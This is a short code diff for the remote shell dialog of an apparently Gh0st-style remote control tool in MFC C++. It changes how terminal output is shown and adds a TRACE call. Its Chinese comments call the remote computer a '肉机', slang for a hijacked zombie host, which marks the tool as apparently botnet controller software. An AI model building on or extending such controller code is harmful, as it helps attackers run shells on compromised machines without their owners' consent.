@@ -34,6 +34,7 @@ void CShellDlg::DoDataExchange(CDataExchange* pDX)
 	DDX_Control(pDX, IDC_EDIT_SHELL, m_edit);
 }
 
+// 将肉机终端显示的内容，显示到编辑框控件m_edit
 void CShellDlg::AddKeyBoardData()
 {
 	// 最后填上0
@@ -42,8 +43,10 @@ void CShellDlg::AddKeyBoardData()
 
 	strResult.Replace("\n", "\r\n");
 	int	len = m_edit.GetWindowTextLength();
-	m_edit.SetSel(len, len);
+	// 减去20，是为了去掉返回的命令显示
+	m_edit.SetSel(len - 20, len);
 	m_edit.ReplaceSel(strResult);
+	TRACE(strResult);
 	m_nCurSel = m_edit.GetWindowTextLength();
 }
 
@@ -112,7 +115,7 @@ BOOL CShellDlg::OnInitDialog()
 
 	m_edit.SetLimitText(MAXDWORD); // 设置最大长度
 
-	// 通知远程控制端对话框已经打开
+	// 通知肉机对话框已经打开
 	BYTE bToken = COMMAND_NEXT;
 	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
 
